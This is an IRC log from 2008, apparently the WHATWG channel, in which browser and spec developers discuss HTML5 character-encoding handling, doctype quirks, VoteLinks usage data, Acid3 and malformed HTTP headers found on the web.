(that might conflict with existing click event handlers (in case of form controls) so you need to make choices how to handle those, etc.)

[06:14:01.0000] <annevk>
more ways to do something always makes things more complicated, and increases QA cost, etc.

[06:18:00.0000] <Philip`>
Ah, sounds like the issue is that e.g. a <button> currently has one default click handler and n DOM click event handlers, and <button href> would change that to be >1 default click handler rather than changing it to n+1 DOM click event handlers

[06:19:00.0000] <Philip`>
(and so then things like preventDefault would become confusing, because there's no longer just one default handler)

[06:20:00.0000] <annevk>
it's also not clear if submitting the form and following a link at the same time makes any sense

[06:22:00.0000] <Philip`>
Another issue is you'd sometimes want the other link-related attributes like rel and target and ping, and you'd have media and hreflang and type too for consistency, which would get messy

[07:24:00.0000] <Philip`>
http://www.google.com/m/search?q=%ef%bf%bf

[07:33:00.0000] <zcorpan>
Philip`: it amuses you doesn't it? :)

[07:36:00.0000] <Philip`>
zcorpan: It would be more fun if it wasn't so trivial to find exactly the same bugs in every XHTML site :-)

[07:43:00.0000] <Lachy>
the problem is that so few developers understand, or even bother to consider, character encoding issues

[07:44:00.0000] <Lachy>
the bigger problem is that character encodings are too complex for most people to understand

[07:45:00.0000] <annevk>
hmm, why do I get "invalid character" in Opera for http://www.google.com/m/search?q=%ef%bf%bf but the same Acid3 test still fails?

[07:49:00.0000] <Camaban>
I agree with that Lachy, I've never found anything talking about character encoding that I could understand terribly well.  I can look up and find various bits of info about doctypes and stuff, but good, understandable character encoding info seems a lot harder to find

[07:55:00.0000] <annevk>
ALA prefers IE-propaganda :o

[08:03:00.0000] <Lachy>
Camaban, search for "Guide to Unicode" in google, then read the first result

[08:03:01.0000] <Lachy>
http://lachy.id.au/log/2004/12/guide-to-unicode-part-1

[08:06:00.0000] <Camaban>
will hvae a look :)

[08:23:00.0000] <Camaban>
Lachy: sorry, but that comes under the heading of 'stuff I struggle to udnerstand', and I've only read the first couple of paragraphs

[08:23:01.0000] <Lachy>
Camaban, really? I was told by so many people that it was really easy to understand

[08:23:02.0000] <Camaban>
Since version 1.1, the Unicode standard has remained fully compatible with ISO/IEC 10646: Universal Multiple-Octet Coded Character Set. The ISO/IEC 10646 standard defines a character repertoire and character code points (or code positions), as well as two character encodings, UCS-2 and UCS-4, allowing for up to 232 code points.

[08:24:00.0000] <Camaban>
that means absollutely nothing to me

[08:24:01.0000] <Lachy>
it gets easier

[08:24:02.0000] <Camaban>
I'll have to have another go at getting further into it when I have a bit more time then

[08:26:00.0000] <annevk>
Camaban, seen http://www.joelonsoftware.com/articles/Unicode.html already?

[08:27:00.0000] <Camaban>
annevk: no, looks like perhaps I dind't know what to search for :)

[08:27:01.0000] <Lachy>
if you read that one from Joel, then you have to read this one first http://ln.hixie.ch/?start=1066145333&count=1

[08:28:00.0000] <annevk>
Camaban, I think that one is really good, and pretty accessible too

[08:29:00.0000] <Camaban>
from a quick scan, it looks so

[08:30:00.0000] <Camaban>
as a guy who generally codes up HTML/CSS, I tended to search for stuff about character encoding to check what I should be putting in the HTML to make it work properly, the idea of actually needing to search for, and find out about unicode hadn't occured to me

[08:31:00.0000] <annevk>
it explains encodings further down

[08:31:01.0000] <Camaban>
yeah, I see that, I guess it needs a few more links to come up in google better :)

[09:41:00.0000] <met_>
annevk http://www.w3.org/TR/2008/WD-XMLHttpRequest2-20080225/  HTML 5 (work in pgoress) s/pgoress/progress

[10:36:00.0000] <annevk>
met_, thanks, fixed

[10:38:00.0000] <met_>
annevk, is it possileble tomake  suchchanges  in released TR document? 

[10:38:01.0000] <met_>
or there is some w3c policy?

[10:40:00.0000] <annevk>
TR docs are snapshots

[10:40:01.0000] <annevk>
it will be fixed in the next snapshot

[10:41:00.0000] <annevk>
sometimes TR docs are "edited in place", but going through that trouble for a Working Draft is not worth it

[10:41:01.0000] <met_>
ok

[11:26:00.0000] <zcorpan>
<!doctype html public "-//w3c//dtd html 4.0 transitional//en" " > appeared 23 times in Philip`'s data

[11:27:00.0000] <zcorpan>
though don't seem too broken in ie because they get terminated at <html lang="..."> or so

[11:29:00.0000] <zcorpan>
looking at the pages it is getting increasingly clear that ignoring the last two characters in the fpi results in better web compat

[11:29:01.0000] <Philip`>
The "//en" characters?

[11:29:02.0000] <zcorpan>
yeah

[11:31:00.0000] <zcorpan>
pages with <!doctype html public "-//w3c//dtd html 4.0 transitional//de"> need quirks mode

[11:43:00.0000] <zcorpan>
aha!

[11:43:01.0000] <zcorpan>
http://www.quintomiglio.com/ is the first that renders better in standards mode in opera and firefox

[11:44:00.0000] <zcorpan>
(gets quirks in opera, standards in firefox)

[11:44:01.0000] <zcorpan>
i had found 14 before that one where the opposite is true

[11:45:00.0000] <zcorpan>
(and a bunch that would render pretty much the same in quirks and no-quirks)

[11:51:00.0000] <annevk>
man, what did I do to this Garett Smith

[11:51:01.0000] <annevk>
Garrett*

[12:34:00.0000] <Hixie>
 annevk: ?

[12:36:00.0000] <annevk>
yo

[12:36:01.0000] <annevk>
ignore my www-archive e-mail please

[12:36:02.0000] <Hixie>
the acid3 one?

[12:36:03.0000] <Hixie>
i saw your reply, was already ignoring both :-)

[12:36:04.0000] <Hixie>
i was wondering what made you wander what you'd did to garrett

[12:37:00.0000] <annevk>
he seems so hostile

[12:37:01.0000] <Hixie>
right, but which thread?

[12:38:00.0000] <annevk>
http://lists.w3.org/Archives/Public/www-style/2008Feb/thread.html#msg274

[12:39:00.0000] <Hixie>
oh, www-style

[12:39:01.0000] <Hixie>
i don't read that anymore

[12:40:00.0000] <annevk>
i do

[12:40:01.0000] <annevk>
I'm still interested in CSS and nobody else is doing it

[12:41:00.0000] <Hixie>
yeah

[12:41:01.0000] <Hixie>
if i wasn't doing html5 i probably would be

[12:41:02.0000] <Hixie>
though i'd be sorely tempted to start a competing organisation to standardise css properly, with a real community, etc, like the whatwg

[12:42:00.0000] <Hixie>
lord, you're right, wtf did you do to this guy

[12:44:00.0000] <jwalden>
existed

[12:45:00.0000] <othermaciej>
he seems kind of angry

[12:47:00.0000] <Hixie>
/me mumbles something about being glad this poem discussion is going on on public-html and not whatwg

[12:47:01.0000] <Hixie>
i like Philip Taylor's comment:

[12:47:02.0000] <Hixie>
"I'm reluctant to enter into this debate, yet

[12:47:03.0000] <Hixie>
feel strangely compelled so to do."

[12:48:00.0000] <annevk>
i tried reading that wiki page, but it was very unclear and very big

[12:48:01.0000] <annevk>
so i gave up and did something else

[12:49:00.0000] <Hixie>
i fear that when it comes time to go through the wiki pages, a lot of them will be getting a response of "the problem is not described well enough for me to address this issue"

[12:50:00.0000] <annevk>
surprisingly many being with describing "the solution"

[12:50:01.0000] <Lachy>
that's because describing a solution is much easier than describing what the problem is

[12:51:00.0000] <Hixie>
yup

[12:51:01.0000] <Hixie>
but as editor i can't care about solutions without understanding the problem

[12:51:02.0000] <Hixie>
since i can't evaluate a solution without knowing the problem

[12:51:03.0000] <Lachy>
I gave up on the HTMLWG wiki a long time ago, when I realised, despite several attempts to nudge them in the right direction, their content remained mostly useless

[12:53:00.0000] <annevk>
as with usability, it seems better to learn what people need than what they want

[12:54:00.0000] <Philip`>
http://tug.ctan.org/cgi-bin/filenameSearch.py?filename=%00 - http://www.hipocampo.org/buscar.asp?search=%01 - http://virtueventures.com/services.php?page=6%ef%bf%bf - this really is too easy

[12:54:01.0000] <Lachy>
I really don't understand what I did to provoke this hostile respone. http://www.w3.org/mid/47C5A056.4080108⊙mn - I thought all I did was try to clarify what the spec was saying to someone who misunderstood it

[12:55:00.0000] <Hixie>
he'd already told me off for not understanding him

[12:55:01.0000] <Hixie>
anyway as far as i'm concerned that issue is resolved

[12:55:02.0000] <Hixie>
since the term "prose" is no longer in the spec

[12:56:00.0000] <Lachy>
yeah, him telling you off is understandable. Everyone seems to do that :-)

[12:57:00.0000] <annevk>
you're part of Hixie's posse Lachy, deal with it :p

[12:57:01.0000] <Hixie>
:-)

[13:02:00.0000] <gsnedders>
/me hides from the Cabel

[13:02:01.0000] <Lachy>
gsnedders, do you have a fear of cables or did you mean cabal?

[13:02:02.0000] <gsnedders>
Lachy: cabal

[13:08:00.0000] <jwalden>
!summon zcorpan

[13:11:00.0000] <Hixie>
/me disillusions people on the semantic web in html5 http://realtech.burningbird.net/semweb/semantic-web-dull-as-dishwater-edition/#comment-372

[13:13:00.0000] <Lachy>
Hixie, no comment from you on that page

[13:14:00.0000] <Lachy>
is it awaiting approval?

[13:15:00.0000] <Hixie>
yeus

[13:21:00.0000] <Dashiva>
/me wonders how they go from "People make links because they're useful, search engines add extra value" to "People add metadata because... there's no benefit whatsoever"

[13:22:00.0000] <Hixie>
feel free to comment also

[13:22:01.0000] <Hixie>
my comment is there now btw

[13:23:00.0000] <Hixie>
http://www.zingermans.com/ is great

[13:23:01.0000] <Hixie>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-16" />

[13:24:00.0000] <Dashiva>
I'll leave commenting to the official opera dudes

[13:31:00.0000] <Lachy>
Dashiva, non-opera people can comment too. It saves us the work :-)

[13:32:00.0000] <Dashiva>
Yeah, but I might say something to make chaals some after me

[13:34:00.0000] <Lachy>
why would chaals come after you? you don't work for Opera, do you?

[13:34:01.0000] <Dashiva>
I have worked for opera three summers in a row now, and I'm several kinds of volunteer rest of the year :)

[14:03:00.0000] <Dashiva>
You got a reply, Hixie :)

[14:03:01.0000] <Hixie>
woah, big reply

[14:05:00.0000] <Dashiva>
I wonder if links going 404 counts as data rot or not as far as bananas go

[14:20:00.0000] <annevk>
i don't think chaals has a bias towards Opera employees

[14:20:01.0000] <annevk>
btw

[14:24:00.0000] <annevk>
lol, TAG gets involved in ARIA

[14:29:00.0000] <Hixie>
/me searches for the mail anne refers to in his "Unlikely to be useful" folder

[14:31:00.0000] <annevk>
Hixie, it now changes UTF-16 to UTF-8 in two separate places, that's the idea?

[14:31:01.0000] <Hixie>
yeah. it was almost three, but i reduced it to two

[14:32:00.0000] <Hixie>
not sure how to merge the last two, but if it gets more complex i'll abstract it out into a separate "set of steps"

[14:33:00.0000] <annevk>
oh also, if you're testing charset and stuff, apparently two out of four browsers require http-equiv=content-type

[14:33:01.0000] <Hixie>
which two?

[14:33:02.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/parsing/encoding/ is my test suite btw

[14:33:03.0000] <annevk>
IE and Opera iirc

[14:33:04.0000] <Hixie>
k

[14:33:05.0000] <Hixie>
seems safe not to require it then

[14:34:00.0000] <annevk>
i suppose

[14:34:01.0000] <Hixie>
it's sad that tbl is no longer really up to date with html on the web

[14:35:00.0000] <Hixie>
hey does anyone have IE? my mac is trying to update itself and i can't run the VM while that's happening

[14:35:01.0000] <annevk>
lets keep track of where we are in a decade

[14:36:00.0000] <annevk>
i have IE7 running, though UI-wise it's limited

[14:36:01.0000] <Hixie>
i need to know the result of these tests:

[14:36:02.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/parsing/encoding/069.html

[14:36:03.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/parsing/encoding/070.html

[14:36:04.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/parsing/encoding/071.html

[14:36:05.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/html/parsing/encoding/072.html

[14:36:06.0000] <annevk>
69: FAIL

[14:37:00.0000] <annevk>
windows-1254 used

[14:37:01.0000] <annevk>
70 fail, windows-1252 used

[14:37:02.0000] <annevk>
71, fail, windows-1254 used

[14:37:03.0000] <annevk>
72 fail, windows-1252 used

[14:38:00.0000] <Hixie>
well crap

[14:38:01.0000] <Hixie>
that's three browsers, three different sets of results

[14:38:02.0000] <Hixie>
firefox is Windows-1252 for all four

[14:38:03.0000] <SadEagle>
heh. for more fun, not that you care, konq3 uses iso-8859-9 --- supposedly, and... well, let's not talk about what 4 does

[14:38:04.0000] <Hixie>
safari is ISO-8859-9 (equiv of 1254 for the sake of this test) for all four

[14:39:00.0000] <Hixie>
how about opera?

[14:39:01.0000] <annevk>
maybe IE doesn't do content="...;charset='...'"

[14:39:02.0000] <annevk>
Opera passes all four

[14:40:00.0000] <Hixie>
ISO-8859-9?

[14:40:01.0000] <Hixie>
hm

[14:40:02.0000] <Hixie>
well crap

[14:40:03.0000] <annevk>
Opera ftw

[14:40:04.0000] <annevk>
:)

[14:40:05.0000] <Hixie>
well, "pass" is actually not what the spec says right now

[14:40:06.0000] <Hixie>
windows-1252 for all four is what the spec currently requires

[14:41:00.0000] <Hixie>
looks like spaces in encoding names is rare

[14:41:01.0000] <Dashiva>
Oh, Hixie. You and your wacky testcase hijinx

[14:41:02.0000] <Hixie>
so i guess, no trimming.

[14:44:00.0000] <Philip`>
annevk: In IE7, I see "PASS" ("Windows-1252") in 070 and 072

[14:44:01.0000] <Hixie>
i just changed the tests

[14:44:02.0000] <Philip`>
Ah

[14:44:03.0000] <Hixie>
anne's earlier report is now out of date

[14:49:00.0000] <Dashiva>
"But professor, these are the same questions as last year's exam!" "I know. I changed the answers."

[14:53:00.0000] <Philip`>
/me is reminded of a quiz show that asked how many moons the Earth has, and the correct answer was two; and the next year they asked the same question, and the answer "two" resulted in -10 points because the correct answer was now five

[14:53:01.0000] <Lachy>
Hixie, Philip`, do either of you have any stats on how much VoteLinks are used? rel=vote-for, vote-against, and vote-abstain?

[14:54:00.0000] <Hixie>
haven't seen it, but i haven't done studies for rel="" in a while

[14:55:00.0000] <blooberry>
lachy: what context are they used in? (element)

[14:56:00.0000] <Lachy>
blooberry, http://microformats.org/wiki/vote-links

[14:56:01.0000] <blooberry>
ah...A element. gotcha

[14:57:00.0000] <blooberry>
quick check: 7 times in DMoz URL set for vote-for. didn't find any for the others. Would have to do a deeper check to see if I'm looking for the right thing.

[14:59:00.0000] <Lachy>
technorati has removed their vote-links tracking page. I guess that means it failed. http://www.technorati.com/live/votes.html

[15:00:00.0000] <Hixie>
live and learn

[15:02:00.0000] <blooberry>
ah, I see...it is used more in REV attribute than REL. I found cases for all values...not many though: for: 29 cases; against: 14 cases; abstain: 12

[15:09:00.0000] <Hixie>
out of?

[15:10:00.0000] <blooberry>
3.5 million

[15:11:00.0000] <Hixie>
wow

[15:11:01.0000] <Philip`>
I see http://www.ehlinelaw.com and http://www.wiredprairie.us out of some tens of thousands that it's still processing

[15:11:02.0000] <Hixie>
that's low enough that they might be typos!

[15:11:03.0000] <blooberry>
indeed. 8-} 

[15:11:04.0000] <blooberry>
I'll get a URL list for those now...should take a couple minutes. There could be some URL overlap there too.

[15:12:00.0000] <Lachy>
0.0008% seems quite insignificant

[15:12:01.0000] <Lachy>
I don't need it

[15:13:00.0000] <Philip`>
Hmph, lots of web pages use attributes

[15:13:01.0000] <Lachy>
Just needed to know whether or not it had any real world usage, in order to say whether or not it should be included in an HTML reference I'm reviewing

[15:13:02.0000] <Philip`>
/me 's interesting-attribute extraction thing has got to 500MB of output from 50K pages

[15:14:00.0000] <Philip`>
blooberry: By the way, I don't know if you noticed but it looks like almost all of cnn.com has been removed from dmoz.org

[15:15:00.0000] <Hixie>
man i wish people wouldn't say things like "in 8.2.2.1 step 3"

[15:15:01.0000] <Hixie>
who knows what that will refer to by the time i reply to the e-mail

[15:15:02.0000] <Lachy>
LOL

[15:16:00.0000] <Dashiva>
"In line 8137..."

[15:16:01.0000] <blooberry>
philip`: hadn't noticed *cheers*

[15:17:00.0000] <Lachy>
Hixie, maybe you should add a big note to the top of the spec, just about the TOC that says section numbers are subject to change, please refer to sections by title (or something equally descriptive)

[15:18:00.0000] <Hixie>
the people who would notice that are clever enough to work it out for themselves :-)

[15:18:01.0000] <blooberry>
philip`: I have had some similarly large reports for some web page factors

[15:20:00.0000] <Philip`>
I don't want to use up all my disk space because then I'll have to try to figure out the LVM commands to add an extra partition and I'll probably break everything horribly

[15:20:01.0000] <Lachy>
the TOC is likely to be one of the first things people look at when the load the spec, before going to somewhere more specific. I'm sure they would see it if it were big, red and blinking.

[15:21:00.0000] <Dashiva>
It may blink, but parts of it must not flash for more than 3 seconds.

[15:28:00.0000] <gsnedders>
Hixie: am I guilty (of using numbers)?

[15:28:01.0000] <gsnedders>
I know at times I use both number and section title

[15:30:00.0000] <blooberry>
lachy: ah...just noticed the results list came back for rev=vote-*. only 37 URLs total, and 8 of those were on mp3.com URLs. 

[15:30:01.0000] <blooberry>
philip`: Interesting. It didn't find either of those URLs that you mentioned. 8-{ *looks to see if they are actually in my database*

[15:30:02.0000] <blooberry>
(my crawl is from ~3 months ago though)

[15:34:00.0000] <Philip`>
http://www.ehlinelaw.com http://www.wiredprairie.us http://maxicine.com/cine/criticas-cine-moriras-en-tres-dias-31303 is all, out of 125K from a few days ago

[15:34:01.0000] <Hixie>
the rev=vote-against on http://www.wiredprairie.us is bogus

[15:34:02.0000] <Hixie>
(it's to a javascript: uri!)

[15:35:00.0000] <Hixie>
it's talking about what the user is voting against

[15:35:01.0000] <Hixie>
not what the page is voting against

[15:36:00.0000] <Hixie>
and http://www.ehlinelaw.com seems to have vote-for on almost all internal links

[15:36:01.0000] <Hixie>
looks like a misguided SEO attempt

[15:39:00.0000] <blooberry>
hmm. my script isn't picking up the REV from ehlinelaw...interesting and weird.

[15:41:00.0000] <Philip`>
blooberry: Is that something like case sensitivity, or more significant misparsing of the page?

[15:42:00.0000] <blooberry>
it could be. This is worth tracking down. 8-}

[15:48:00.0000] <blooberry>
ah...heheh. not a bug. In my output I was just putting it in a different section that I had hidden. It does find it, so it must be a more recent addition.

[15:57:00.0000] <annevk>
nice, getSVGDocument() == contentDocument now

[15:57:01.0000] <annevk>
would've been better if the former was never introduced, but still


2008-02-29
[16:05:00.0000] <eseidel>
annevk: but does getSVGDocment() === contentDocument...

[16:05:01.0000] <eseidel>
I would expect it to

[16:06:00.0000] <Hixie>
what do you call an attack that is described in a security vulnerability report

[16:06:01.0000] <Hixie>
it's not an actual attack

[16:06:02.0000] <Hixie>
it's not a hypothetical attack

[16:06:03.0000] <Hixie>
it's a...

[16:07:00.0000] <annevk>
eseidel, yeah, it should

[16:08:00.0000] <annevk>
invalid report?

[16:08:01.0000] <Hixie>
?

[16:08:02.0000] <annevk>
nm

[16:12:00.0000] <Hixie>
you know, i should set up some sort of little exam

[16:12:01.0000] <Hixie>
that asks questions like:

[16:13:00.0000] <dveditz>
Hixie: "proof of concept"?

[16:13:01.0000] <Hixie>
Q. which of the following requirements is incorrect:

[16:13:02.0000] <Hixie>
1. a character encoding saying UTF-16 must be treated as UTF-8

[16:15:00.0000] <Hixie>
2. an invalid UTF-8 byte sequence must cause the user agent to informed the user of the presence of an error

[16:15:01.0000] <Hixie>
3. the content-type header of the resource must be ignored

[16:15:02.0000] <dveditz>
can we be typo nazis?

[16:15:03.0000] <annevk>
dveditz, doesn't matter in this case :)

[16:15:04.0000] <Hixie>
and people have to get 80% of the questions right before their input is taken into account

[16:15:05.0000] <Hixie>
/me comes off his high horse

[16:16:00.0000] <Hixie>
dveditz: proof of concept is perfect, thanks

[16:16:01.0000] <gsnedders>
Hixie: surely both 2 and 3 are incorrect? Unless substituting U+FFFD for that sequence constitutes informing the user; as the content-type header is sometimes respected (and so isn't totally ignored).

[16:16:02.0000] <dveditz>
it's a std term for non-attacks that demonstrate a vulnerability

[16:17:00.0000] <gsnedders>
</smartass>

[16:17:01.0000] <Hixie>
gsnedders: well, i really meant "which of the following requirements must not appear anywhere in the html5 spec"

[16:17:02.0000] <Hixie>
dveditz: yeah. couldn't recall the term :-)

[16:17:03.0000] <annevk>
Hixie, could be part of your book ;)

[16:17:04.0000] <gsnedders>
Hixie: MUST or must? :P

[16:18:00.0000] <gsnedders>
(yes, I had to do that)

[16:18:01.0000] <gsnedders>
Hixie: but the answer is therefore 2

[16:18:02.0000] <annevk>
you alread closed </smartass>; now you're just being invalid

[16:18:03.0000] <annevk>
or maybe ill-formed

[16:18:04.0000] <eseidel>
annevk++

[16:18:05.0000] <gsnedders>
annevk: it has an implicit opening element, as before

[16:19:00.0000] <gsnedders>
s/element/tag/

[16:19:01.0000] <Hixie>
good god you guys are all so pedantic. awesome. i approve.

[16:20:00.0000] <SadEagle>
/me asks Hixie about the meaning of "saying" in #1

[16:20:01.0000] <Hixie>
clearly you all pass this exam with flying colours

[16:21:00.0000] <gsnedders>
see, Hixie didn't even state the exam question well enough for me :P

[16:21:01.0000] <eseidel>
Hixie: are you training your army now?

[16:21:02.0000] <gsnedders>
now, back to a third of my computer exam (i.e., the coursework), which by now is due in today

[16:21:03.0000] <Hixie>
eseidel: my minions! mwuhahaha!

[16:21:04.0000] <Hixie>
er

[16:21:05.0000] <Hixie>
did i say that out loud

[16:22:00.0000] <gsnedders>
No. You typed it.

[16:22:01.0000] <gsnedders>
Actually, I don't know if you did.

[16:22:02.0000] <gsnedders>
But you certainly typed it.

[16:23:00.0000] <gsnedders>
You may be mistaking the two media.

[16:24:00.0000] <Philip`>
Is there any text-to-speech software that can be trained to do evil laughs?

[16:30:00.0000] <Dashiva>
I don't know, but I know there's a "rim shot" flash

[16:30:01.0000] <Dashiva>
Always a winner in good company

[16:30:02.0000] <SadEagle>
Philip`: just ask hixie to send you voice samples

[16:30:03.0000] <SadEagle>
/me wonders about aural CSS for that sort of thing

[16:30:04.0000] <Dashiva>
laugh-type: mad-scientist;

[16:31:00.0000] <annevk>
laugh-lang: en-GB--or-was-it-US-x-Hixie;

[16:32:00.0000] <annevk>
/me should get some sleep

[16:32:01.0000] <annevk>
nn

[16:32:02.0000] <gsnedders>
nn

[16:32:03.0000] <gsnedders>
/me needs less urgent deadlines

[16:32:04.0000] <Dashiva>
Is hx taken as language code? Otherwise we could use that

[16:33:00.0000] <Dashiva>
The whole en-GB-x-hixie thing just leads to copy-paste markup

[16:33:01.0000] <Dashiva>
It's just a talisman anyhow

[16:33:02.0000] <Philip`>
gsnedders: I find deadlines are only urgent because I never do any work before they are :-)

[16:34:00.0000] <gsnedders>
Philip`: heh. I've been too ill to. I normally do spend the entire day doing nitpicking editing, not writing half the damned thing.

[16:34:01.0000] <kingryan>
Lachy: votelinks have very low adoption

[16:34:02.0000] <kingryan>
probably not worthy a mention in a reference on HTML

[16:46:00.0000] <Hixie>
hsivonen?

[16:46:01.0000] <Hixie>
is http://hsivonen.iki.fi/test/moz/analysis.txt the best and most up to date analysis?

[21:50:00.0000] <Hixie>
ok

[21:50:01.0000] <Hixie>
next complaint

[21:50:02.0000] <Hixie>
could people please tell me what section they're talking about in the body of the message?

[21:51:00.0000] <Hixie>
i don't have the subject line when i do these mass replies :-)

[22:02:00.0000] <jruderman_>
maybe you should tweak your software so you do have subject lines

[22:02:01.0000] <Hixie>
far easier just to complain

[22:37:00.0000] <Hixie>
i love how i have a dozen algorithms in the spec, each of which uses a different set of typographic conventions to do the same thing

[22:37:01.0000] <Hixie>
some use subscripts

[22:37:02.0000] <Hixie>
some use foo[n] syntax

[22:37:03.0000] <Hixie>
some use elaborate english phrases

[23:40:00.0000] <hsivonen>
I'm sick and I'm not really here, but http://hsivonen.iki.fi/test/moz/analysis.txt is the latest analysis of that kind (a month old, though)

[23:51:00.0000] <Hixie>
thanks

[00:49:00.0000] <Hixie>
i don't understand why my site is doing gzip compression

[00:49:01.0000] <Hixie>
i have:

[00:49:02.0000] <Hixie>
<IfModule mod_gzip.c> mod_gzip_on No

[00:49:03.0000] <Hixie>
</IfModule>

[00:49:04.0000] <Hixie>
(er, but on three lines)

[01:11:00.0000] <Hixie>
hm

[01:11:01.0000] <Hixie>
anyone else tried posting to the whatwg list recently?

[01:32:00.0000] <Hixie>
what should <embed ===> parse as?

[01:39:00.0000] <jgraham_>
Hixie: I just tried posting to the whatwg list and got an error response suggesting some disk is full

[01:39:01.0000] <jgraham_>
/me wonders if putting full python tracebacks in the errors is such as good idea

[03:34:00.0000] <annevk>
so it seems Garrett's problem comes down to the CSSOM not following IE in standards mode

[03:35:00.0000] <annevk>
and endorsing what other browsers do with respect to special casing the HTML body element which he considers wrong

[04:01:00.0000] <Philip`>
Oh, it's a leap year?

[04:02:00.0000] <Philip`>
/me fixes his watch, since it's clearly not designed to cope with the complexities of time

[04:03:00.0000] <Philip`>
/me wonders when Time5 will be done

[04:03:01.0000] <annevk>
mine actually says FR 29

[04:07:00.0000] <Philip`>
Hixie: It seems quite possible that you're using mod_deflate instead of mod_gzip, and so you might want something like RemoveOutputFilter

[06:16:00.0000] <Philip`>
/me sees that http://www.mozilla.org/projects/intl/UniversalCharsetDetection.html contains lots of U+FFFD symbols unless you use a manual override for iso-8859-1

[09:01:00.0000] <Philip`>
/me doesn't have any interesting content-type conflicts in his data :-(

[09:01:01.0000] <Philip`>
(I see about 25 sites sending multiple content-types, out of 125K pages, but they're all either sending two the same or are sending one "text/html" and one "text/html; charset=...")

[09:08:00.0000] <Philip`>
http://www.greenvironment.fi - a dozen sites send exactly those Limerick HTTP headers

[09:36:00.0000] <gsnedders>
Philip`: horrific. it should be X-Limerick.

[09:38:00.0000] <gsnedders>
Philip`: it seems to be as common as cneonction headers

[09:41:00.0000] <Philip`>
Most of the Cneonctions come from imdb.com

[09:42:00.0000] <Philip`>
but not all

[09:42:01.0000] <Philip`>
http://labs.google.com/papers.html - Cneonction: close

[09:42:02.0000] <Philip`>
http://labs.google.com/ - NnCoection: close

[09:44:00.0000] <Philip`>
Hixie: ^ bug report :-)

[09:45:00.0000] <Philip`>
gsnedders: I only see Cneonction on 11 different domains

[09:51:00.0000] <Philip`>
Oh, and 11 is about a dozen, so you were right that it's as common

[09:51:01.0000] <Philip`>
+/- some huge margin of error in this data

[10:09:00.0000] <gsnedders>
Philip`: I don't even want to guess how many million percent :P

[10:14:00.0000] <Philip`>
gsnedders: It's nowhere near that huge an error :-p

[10:14:01.0000] <Philip`>
at least when "error" means "difference between measured sample mean and true population mean, where population is the ~4.5M things in dmoz.org that the sample was taken from and isn't necessarily representative of "the web""

[10:15:00.0000] <Philip`>
but I can't remember how to do the statistics and I can't be bothered to find out now :-)

[10:15:01.0000] <gsnedders>
if you define the population to be so small, I guess

[10:15:02.0000] <gsnedders>
Philip`: I'm meant to know for physics :P

[10:16:00.0000] <Philip`>
Why do you say it's small?

[10:16:01.0000] <gsnedders>
dmoz.org, and not the entire web

[10:17:00.0000] <Philip`>
The size of the population doesn't really matter - as long as it's enough times larger than the sample size, there's no benefit in making it much larger again

[10:18:00.0000] <Philip`>
(whereas there's always a benefit in making the sample size larger)

[10:18:01.0000] <Philip`>
so the (non)representativeness is the much more significant issue

[10:19:00.0000] <Philip`>
but that's easy to avoid by just saying "(n+/-e)% of pages from dmoz.org have some property" and if somebody tries to generalise that to the rest of the web then that's their fault and not mine

[10:34:00.0000] <kingryan>
/me is learning that he's "part of the problem" :)

[11:04:00.0000] <gsnedders>
/me laughs

[11:04:01.0000] <gsnedders>
post to whatwg needs to be moderated: "Too many recipients to the message"

[11:06:00.0000] <Lachy>
gsnedders, which post are you referring to?

[11:20:00.0000] <jgraham>
gsnedders: I got that on the content type sniffing thread. OTOH, I didn't mean to send it to whatwg at all

[11:33:00.0000] <gsnedders>
Lachy: to the whatwg mailing list

[12:34:00.0000] <annevk>
Hixie, Firefox is sniffing Content-Encoding stuff too now?

[12:35:00.0000] <Hixie>
no but apparently they are aware of pages they want to render correctly that they are not rendering correctly because of this, and so they plan to change to not be affected by the presence or absensce of that header

[12:36:00.0000] <annevk>
k

[12:50:00.0000] <Hixie>
aw, apparently I "haven't the faintest idea of how to write a specification that

[12:50:01.0000] <Hixie>
will last beyond the current fad-of-the-day in implementations"

[12:51:00.0000] <Hixie>
i wonder what it means for a specification to last... does a specification last if nobody implements it correctly?

[12:51:01.0000] <SadEagle>
Hixie: beats writing unimplementable specs

[12:51:02.0000] <Hixie>
can't disagree with that

[12:51:03.0000] <annevk>
you don't really want static specs anyway

[12:53:00.0000] <annevk>
Hixie, fwiw, https://bugzilla.mozilla.org/show_bug.cgi?id=408098

[12:55:00.0000] <gsnedders>
Hixie: where did that come from?

[12:57:00.0000] <Hixie>
latest mail to public-html

[12:57:01.0000] <gsnedders>
Hixie: re: your mention of my parsing draft, I really need to scrap what I've written already :)

[12:57:02.0000] <Hixie>
right, time to shower and go to work. bbl.

[13:55:00.0000] <eseidel>
Hixie: is Acid3 final now?

[14:30:00.0000] <Hixie>
eseidelDesk: ye, but for some reason it still hasn't been announced

